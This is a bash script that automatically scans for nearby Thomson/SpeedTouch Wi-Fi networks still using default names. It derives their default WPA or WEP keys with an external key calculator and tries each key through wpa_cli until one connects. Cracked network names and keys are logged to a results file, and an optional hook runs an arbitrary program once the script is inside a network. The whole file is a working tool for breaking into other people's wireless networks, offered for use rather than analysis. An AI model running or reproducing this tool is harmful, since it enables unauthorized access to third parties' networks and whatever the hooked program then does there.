#!/bin/bash

# A quick & dirty script that scans for Thomson/SpeedTouch networks
# with default SSIDs and tries to guess their PSKs. Can optionally
# execute a script after being connected (called "autoscript" in the
# source).

# Copyright 2011 Manuel Acanthephyra
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>. 

# Path to wpa_cli
WPA=/usr/bin/wpa_cli

# Path to a script (must be a python script for now, but you can change that) that calculates default PSKs
CRACK=./touchspeedcalc_test.py

# Output file. Will contain lines of the form SSID PSK [WEP]
# (and I'm aware that PSK is not the correct term for WEP, eat your heart out)
RESULTS=./results.txt

# How many seconds do we want to wait to be connected to a network before giving up?
AUTH_LIMIT=10

# If there is an autoscript set, how long should we wait to get an IP from DHCP?
IP_WAIT_LIMIT=20

# A script that will be executed as soon as we're connected and have an IP
#AUTOSCRIPT="java -jar ./votey.jar"

# Maximum runtime of the autoscript before we simply move on to the next network
AUTOSCRIPT_RUNTIME=30


# Tries out a specific key and returns the result (0 if successful)
# PARAMS: ssid psk ["WEP"]
try_key()
{
	# Configure new network
	export NETNUMBER=`$WPA add_network | tail -1`
	$WPA set_network $NETNUMBER ssid "\"$1\"" 1>/dev/null

	# special handling for WEP networks
	if [ "$3" = "WEP" ]
	then
		$WPA set_network $NETNUMBER key_mgmt NONE 1>/dev/null
		$WPA set_network $NETNUMBER wep_key0 $2 1>/dev/null
	else # Regular WPA
		$WPA set_network $NETNUMBER psk "\"$2\"" 1>/dev/null
	fi

	$WPA enable_network $NETNUMBER 1>/dev/null
	# Select the network & try to connect

	$WPA disconnect 1>/dev/null
	$WPA select_network $NETNUMBER 1>/dev/null
	$WPA reconnect 1>/dev/null

	# Wait for AUTH_LIMI seconds, then check the status

	let "limit=${AUTH_LIMIT}"
	while [ $limit -ge 0 -a `$WPA status | grep wpa_state` != "wpa_state=COMPLETED" ]
	do
		sleep 1
		echo "Waiting ${limit} more seconds for connection..."
		let "limit=${limit}-1"
	done

	# If status ok, then output 0, otherwise 1
	if [ `$WPA status | grep wpa_state` = "wpa_state=COMPLETED" ]
	then
		echo "YAY"
		if [ -n "${AUTOSCRIPT}" ]
                        then
                                waitround=1
                                while [ "0" = `$WPA status | grep -c ip_address` -a ${waitround} -le ${IP_WAIT_LIMIT} ]
                                do
                                        sleep 1 
                                        echo "Waiting for IP... (${waitround}/${IP_WAIT_LIMIT})"
                                        let "waitround=${waitround}+1"

                                done
				if [ "0" = `$WPA status | grep -c ip_address` ]
				then
					echo "Did not get IP, can not execute autoscript."
					return 0
				fi
				echo "Executing autoscript..."
                                $AUTOSCRIPT 2> autoscript-errors-$(date | awk '{print $4;}') >autoscript-$(date | awk '{print $4;}') &
				autoscript_pid=$!
				echo "Execution started, waiting ${AUTOSCRIPT_RUNTIME} seconds to finish."
				elapsed=1
				while [ $elapsed -le $AUTOSCRIPT_RUNTIME -a `ps | grep -c ${autoscript_pid}` != "0" ]
				do
					sleep 1
					let "elapsed=${elapsed}+1"
					let "remaining=${AUTOSCRIPT_RUNTIME}-${elapsed}"
					echo "${remaining} seconds remaining..."
				done
                                echo "Autoscript execution time elapsed or autoscript completed, continuing our normal operation :)"
                        fi

		$WPA remove_network $NETNUMBER 1>/dev/null
		return 0
	else
		echo "BOO"
		$WPA remove_network $NETNUMBER 1>/dev/null
		return 1
	fi
}

# Tries to crack the key for a certain network
crack_net()
{
	export NETNAME=$1
	i=0
	success=0
	echo "Trying to crack ${NETNAME}"
        # Determine all possible keys
	python $CRACK ${NETNAME:(-6)} | grep ACCESSKEY | awk '{print $2;}' | while read key
	do
		echo "Trying out ${key}"
		try_key $NETNAME ${key} $2
		if [ 0 -eq $? ]
		then
			echo "SUCCESS! $NETNAME ${key} $2"
			echo "$NETNAME ${key} $2" >> $RESULTS
			success=1

			return 0
		fi
	done

	#if [ 1 -ne $success ]
	#then
	#	echo "No valid key found for ${NETNAME}"
	#	return 1
	#fi
}


touch $RESULTS
while [ 0 -eq 0 ] # main loop
do
	#TODO start scan
	$WPA scan 1>/dev/null
	sleep 3 
	$WPA scan_results | grep WPA | awk '$5 != "" {print $5;}' > /tmp/wpanets_current
	cat /tmp/wpanets* | sort -u > /tmp/wpanets_total$(date | awk '{print $4;}') 
	$WPA scan_results | grep WEP | awk '$5 != "" {print $5;}' > /tmp/wepnets_current
	cat /tmp/wepnets* | sort -u > /tmp/wepnets_total$(date | awk '{print $4;}')
	grep -F "Thomson
SpeedTouch" /tmp/wpanets_current | while read NET
	do
		if [ "0" = `grep -c $NET $RESULTS` ]
		then
			crack_net $NET
		fi
	done
	grep -F "Thomson
SpeedTouch" /tmp/wepnets_current | while read NET
	do
		if [ "0" = `grep -c $NET $RESULTS` ]
		then
			crack_net $NET "WEP"
		fi
	done
done
